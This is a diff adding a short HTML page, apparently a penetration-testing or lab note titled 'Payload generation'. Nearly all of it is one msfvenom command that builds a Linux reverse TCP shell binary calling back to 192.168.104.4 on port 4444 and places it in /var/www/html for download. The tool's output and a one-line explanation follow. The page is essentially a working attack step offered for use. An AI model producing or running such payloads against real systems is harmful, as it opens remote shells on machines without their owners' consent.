@@ -1,0 +1,16 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Payload generation</title>
+</head><body>msfvenom -p linux/x86/shell_reverse_tcp CMD=/bin/sh LHOST=192.168.104.4 LPORT=4444 -f elf &gt; /var/www/html/shell<br/>
+<br/>
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload<br/>
+No Arch selected, selecting Arch: x86 from the payload<br/>
+No encoder or badchars specified, outputting raw payload<br/>
+Payload size: 68 bytes<br/>
+Final size of elf file: 152 bytes<br/>
+<br/>
+<br/>
+It will create a shell binary and put it in /var/www/html folder<br/>
+</body></html>
